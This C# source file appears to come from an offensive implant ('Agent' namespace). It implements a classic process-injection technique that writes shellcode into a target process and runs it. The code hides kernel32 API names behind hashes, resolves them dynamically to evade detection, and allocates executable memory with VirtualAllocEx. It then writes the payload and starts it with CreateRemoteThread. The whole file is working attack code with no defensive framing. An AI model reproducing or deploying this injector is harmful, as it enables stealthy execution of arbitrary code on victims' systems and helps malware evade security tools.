using System;
using System.Collections.Generic;
using System.Diagnostics;
using Invoker.Data;
using Invoker.Dynamic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent
{
    internal class ClassicInjection : ITechnique
    {
        int ITechnique.id => 1;
        private long key = 0x617468656E61;
        private delegate IntPtr VirtAllocExDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwSize, Native.AllocationType flAllocationType, Native.MemoryProtection flProtect);
        private delegate bool WriteProcMemDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate nint CrtDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, Native.ThreadCreationFlags dwCreationFlags, out IntPtr hThread);

        private Dictionary<string, string> map = new Dictionary<string, string>()
        {
            { "crt","D2CF12547B8E0297710F0C1B7A6B8174" },
            { "vae", "B0EEE07D4F1EA12B868089343F9264C6" },
            { "wpm", "A7592F86BEF17E2705EE75EFA81EF52B" },
            { "k32", "A63CBAF3BECF39638EEBC81A422A5D00" }
        };

        public bool Inject(byte[] shellcode, IntPtr hTarget)
        {
            return this.Run(hTarget, shellcode);
        }

        public bool Inject(byte[] shellcode, Process proc)
        {
            return this.Run(proc.Handle, shellcode);
        }

        private bool Run(IntPtr target, byte[] shellcode)
        {
            // allocate some memory for our shellcode            
            var k32Mod = Generic.GetLoadedModuleAddress(map["k32"], key);

            if(k32Mod == IntPtr.Zero)
            {
                return false;
            }

            var pFunc = Generic.GetExportAddress(k32Mod, map["vae"], key);
            
            if(pFunc == IntPtr.Zero)
            {
                return false;
            }

            //IntPtr pAddr = Native.VirtualAllocEx(target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE);
            object[] vaeParams = new object[] { target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE };
            IntPtr pAddr = Generic.DynamicFunctionInvoke<IntPtr>(pFunc, typeof(VirtAllocExDelegate), ref vaeParams);

            if (pAddr == IntPtr.Zero)
            {
                return false;
            }
            pFunc = Generic.GetExportAddress(k32Mod, map["wpm"], key);



            // write the shellcode into the allocated memory
            if (!Native.WriteProcessMemory(target, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten))
            {
                return false;
            };

            // create the remote thread
            IntPtr hThread = Native.CreateRemoteThread(target, IntPtr.Zero, 0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, out hThread);

            if (hThread == IntPtr.Zero)
            {
                return false;
            }
            return true;
        }
    }
}
